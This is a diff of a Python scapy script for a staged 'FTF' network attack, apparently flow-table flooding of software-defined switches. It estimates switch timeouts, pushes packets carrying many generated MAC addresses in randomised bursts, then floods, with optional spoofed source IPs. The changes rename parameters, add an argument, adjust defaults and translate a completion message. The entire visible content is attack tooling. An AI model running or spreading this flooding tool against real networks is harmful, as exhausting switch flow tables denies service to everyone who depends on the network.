@@ -11,7 +11,7 @@ from scapy.all import sendp
 
 from ftf_utils import FTFUtils
 
-def stage_0(dst_ip, max_iter=1000, max_interval=100):
+def stage_0(dst_ip, max_iter, max_interval):
     hard_timeout = FTFUtils.estimate_hard_timeout(dst_ip, max_iter, max_interval)
     print(f"[*] T_hard={hard_timeout}", flush=True)
     sleep(hard_timeout)
@@ -19,7 +19,7 @@ def stage_0(dst_ip, max_iter=1000, max_interval=100):
     print(f"[*] T_idle={af}", flush=True)
     return hard_timeout, af
 
-def stage_1(iface, npacket, added_new_packets, attack_frequency, local_ip: bool=False):
+def stage_1(iface, npacket, added_new_macs, attack_frequency, local_ip: bool=False):
     packets = []
     macs = []
     for _ in range(npacket):
@@ -32,8 +32,7 @@ def stage_1(iface, npacket, added_new_packets, attack_frequency, local_ip: bool=
     i = 0
     n_pkts = len(packets)
     while i < n_pkts:
-        #j = FTFUtils.random_anp(added_new_packets)
-        j = FTFUtils.random_anp(50)
+        j = FTFUtils.random_anp(added_new_macs)
         sendp(packets[i:i + j], iface=iface, verbose=False)
         sleep(FTFUtils.random_af(attack_frequency))
         i += j
@@ -66,9 +65,10 @@ def main():
     parser.add_argument('--dst-ip', required=True, help="Destination IP per stage 0")
     parser.add_argument('--npacket', type=int, required=True)
     parser.add_argument('--anp', type=int, required=True)
-    parser.add_argument('--max-iter', type=int, default=1000)
-    parser.add_argument('--max-interval', type=int, default=100)
-    parser.add_argument('--local-ip', type=bool, default=False, help="Spoofed IP address 10.0.0.X")
+    parser.add_argument('--anm', type=int, required=True)
+    parser.add_argument('--max-iter', type=int, default=100)
+    parser.add_argument('--max-interval', type=int, default=10)
+    parser.add_argument('--local-ip', type=bool, default=False, help="Spoofed IP address in range 10.0.0.X")
     parser.add_argument('--out-file', type=str, default="/tmp/ftf.csv")
     args = parser.parse_args()
 
@@ -83,12 +83,12 @@ def main():
         writer.writerow([args.npacket, hard_timeout, attack_frequency])
         
     print(f"# [STAGE 1] MAC Presenting, timestamp {int(time())}", flush=True)
-    macs = stage_1(args.iface, args.npacket, args.anp, attack_frequency, args.local_ip)
+    macs = stage_1(args.iface, args.npacket, args.anm, attack_frequency, args.local_ip)
 
     print(f"# [STAGE 2] Flooding, timestamp {int(time())}", flush=True)
     stage_2(args.iface, args.npacket, args.anp, attack_frequency, macs, args.local_ip)
 
-    print(f"[+] Attacco completato, timestamp {int(time())}", flush=True)
+    print(f"[+] FTF attack completed, timestamp {int(time())}", flush=True)
     
 if __name__ == '__main__':
     main()
